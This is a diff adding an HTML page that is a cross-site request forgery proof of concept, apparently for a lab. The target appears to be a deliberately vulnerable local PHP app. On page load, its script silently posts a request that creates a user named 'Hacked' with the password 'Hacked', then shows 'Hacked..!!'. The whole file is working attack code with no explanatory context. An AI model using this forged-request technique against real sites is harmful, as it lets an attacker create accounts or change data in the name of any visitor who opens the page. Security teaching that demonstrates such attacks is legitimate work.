@@ -1,0 +1,20 @@
+<html>
+	<head>
+		<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+		
+		<script>
+		var dat="uname=Hacked&pwd=Hacked&submit=ADD";
+		
+		$.ajax({
+			url:'http://localhost/csrf_vulnerable/save_user.php',
+			method:'post',
+			data:dat,
+		})
+		</script>
+		
+	</head>
+	
+	<body>
+		<h1>Hacked..!!</h1>	
+	</body>
+</html>
